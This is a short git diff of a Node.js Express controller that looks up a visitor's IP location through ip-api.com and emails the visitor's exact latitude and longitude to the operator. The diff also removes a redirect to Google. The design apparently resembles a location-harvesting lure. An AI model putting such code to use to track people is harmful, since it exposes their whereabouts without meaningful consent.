@@ -8,8 +8,8 @@ const ServiceEmail = require('../modules/ServiceEmail')
 class IndexController{
 
     static async getSalvarLocalizacao(req, res) {
-        const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
-
+        const rawIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
+        const ip = rawIp.split(',')[0].trim();
         async function getLocalizacaoPorIP(ip) {
             try {
                 const response = await axios.get(`http://ip-api.com/json/${ip}`);
@@ -38,11 +38,9 @@ class IndexController{
 
     static async postSalvarLocalizacao(req, res) {
         const { latitude, longitude } = req.body;
-        console.log('Aceitou comprimento de localizacao');
-        console.log('Latitude:', latitude);
-        console.log('Longitude:', longitude);
+        console.log('Aceitou compartilhamento de localizacao exata!');
+        console.log('Lat:', latitude, 'Lon:', longitude);
         await ServiceEmail.enviarLocalizacaoExata(latitude, longitude)
-        return res.redirect('www.google.com')
     }
 
     static async getIndex(req, res) {
